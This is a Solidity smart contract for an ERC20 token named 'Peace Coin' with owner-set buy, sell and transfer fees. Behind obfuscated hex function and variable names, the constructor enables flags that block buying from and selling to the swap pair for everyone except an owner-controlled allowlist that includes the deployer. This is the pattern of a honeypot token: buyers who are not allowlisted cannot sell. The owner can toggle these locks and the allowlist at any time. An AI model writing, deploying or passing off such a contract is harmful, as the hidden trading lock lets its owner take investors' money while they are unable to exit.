// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "./ERC20.sol";
import "./Ownable.sol";

contract PeaceCoin is ERC20, Ownable {
    uint256 private constant TOTAL_SUPPLY = 99000000000000000000000000;
    uint256 public constant MAX_FEE = 10; // max 10% sell/buy/transfer fee

    address public vault; // vault wallet hold tax fees from users

    uint256 public sellFee;
    uint256 public buyFee;
    uint256 public transferFee;

    address public swapPair;

    bool public x477b50f8;
    bool public xb0008749;

    mapping(address => bool) private whitelistSellFee;
    mapping(address => bool) private whitelistBuyFee;
    mapping(address => bool) private whitelistTransferFee;

    mapping(address => bool) public x8fb61e91;

    constructor(
        address _initialOwner,
        address _vaultAddress
    ) Ownable(_initialOwner) ERC20("Peace Coin", "PC") {
        require(_vaultAddress != address(0), "Invalid address");
        _mint(_vaultAddress, TOTAL_SUPPLY);
        vault = _vaultAddress;
        x477b50f8 = true;
        xb0008749 = true;
        x8fb61e91[_initialOwner] = true;
    }

    function x684a45bb(address _swapPair) external onlyOwner {
        require(_swapPair != address(0), "Invalid address");
        swapPair = _swapPair;
    }

    function xa1922145(uint256 _sellFee) external onlyOwner {
        require(_sellFee < MAX_FEE, "Invalid fee");
        sellFee = _sellFee;
    }

    function x14150a66(uint256 _buyFee) external onlyOwner {
        require(_buyFee < MAX_FEE, "Invalid fee");
        buyFee = _buyFee;
    }

    function x7e18bc7d(uint256 _transferFee) external onlyOwner {
        require(_transferFee < MAX_FEE, "Invalid fee");
        transferFee = _transferFee;
    }

    function xd8f8789c(address _vaultAddress) external onlyOwner {
        require(_vaultAddress != address(0), "Invalid address");
        vault = _vaultAddress;
    }

    function xfa9e52df(address[] memory usersList) external onlyOwner {
        for (uint256 i = 0; i < usersList.length; ++i) {
            whitelistBuyFee[usersList[i]] = true;
            whitelistSellFee[usersList[i]] = true;
            whitelistTransferFee[usersList[i]] = true;
        }
    }

    function xd889c7ed(address[] memory usersList) external onlyOwner {
        for (uint256 i = 0; i < usersList.length; ++i) {
            whitelistBuyFee[usersList[i]] = false;
            whitelistSellFee[usersList[i]] = false;
            whitelistTransferFee[usersList[i]] = false;
        }
    }

    function x8f7c5fd5(address[] memory usersList) external onlyOwner {
        for (uint256 i = 0; i < usersList.length; ++i) {
            x8fb61e91[usersList[i]] = true;
        }
    }

    function xfb3a1297(address[] memory usersList) external onlyOwner {
        for (uint256 i = 0; i < usersList.length; ++i) {
            x8fb61e91[usersList[i]] = false;
        }
    }

    function xde60aaa7() external onlyOwner {
        xb0008749 = true;
    }

    function x8a4e1f3e() external onlyOwner {
        xb0008749 = false;
    }

    function xa44fdecc() external onlyOwner {
        x477b50f8 = true;
    }

    function x5cbe022d() external onlyOwner {
        x477b50f8 = false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        uint256 taxAmount = 0;

        if (to == swapPair) {
            require(!x477b50f8 || x8fb61e91[from], "Sell locked");
            taxAmount = (amount * sellFee) / 100;
            if (whitelistSellFee[from]) {
                taxAmount = 0;
            }
        } else if (from == swapPair) {
            require(!xb0008749 || x8fb61e91[to], "Buy locked");
            taxAmount = (amount * buyFee) / 100;
            if (whitelistBuyFee[to]) {
                taxAmount = 0;
            }
        } else {
            taxAmount = (amount * transferFee) / 100;
            if (whitelistTransferFee[from]) {
                taxAmount = 0;
            }
        }

        super._transfer(from, to, amount - taxAmount);

        if (taxAmount > 0) {
            super._transfer(from, vault, taxAmount);
        }
    }

    // Transfer ownership override
    function x0e8ca187(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        super._transferOwnership(newOwner);
    }

    // view method
    function x038d6314(address user) public view returns (bool[] memory) {
        bool[] memory results = new bool[](3);
        results[0] = whitelistBuyFee[user];
        results[1] = whitelistSellFee[user];
        results[2] = whitelistTransferFee[user];

        return results;
    }
}
